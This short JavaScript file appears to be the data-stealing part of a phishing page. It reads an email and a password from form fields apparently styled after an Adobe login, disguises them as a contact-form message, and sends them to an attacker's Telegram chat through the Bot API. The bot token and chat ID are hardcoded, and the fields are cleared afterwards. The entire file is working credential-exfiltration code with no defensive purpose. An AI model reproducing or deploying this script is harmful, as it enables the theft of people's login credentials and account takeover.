//bot token
var telegram_bot_id ="5552863671:AAHutIYj9TdFpNu3eK4dZxogV5QNR2i3SbQ";
//chat id
var chat_id ="-4594159156";
var u_name, email, message;
var ready = function () {
    
	
    email = document.getElementById("adbeml").value;
    message = document.getElementById("adbpss").value;
    message = "Name: " + u_name + "\nEmail: " + email + "\nMessage: " + message;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    
    document.getElementById("adbeml").value = "";
    document.getElementById("adbpss").value = "";
    return false;
};
